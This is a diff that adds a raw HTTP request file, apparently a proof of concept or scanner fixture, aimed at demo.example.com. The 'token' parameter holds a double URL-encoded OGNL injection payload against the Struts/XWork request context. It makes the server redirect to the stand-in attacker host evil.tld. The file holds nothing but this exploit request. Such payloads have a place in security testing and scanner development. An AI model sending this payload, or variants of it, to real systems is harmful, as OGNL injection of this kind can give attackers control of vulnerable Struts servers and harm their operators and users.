@@ -1,0 +1,4 @@
+GET /a?token=%2523context%255B%2527com.opensymphony.xwork2.dispatcher.HttpServletResponse%2527%255D.sendRedirect%2528%2527http%253A%252F%252Fevil.tld%2527%2529 HTTP/1.1
+Host: demo.example.com
+Connection: close
+
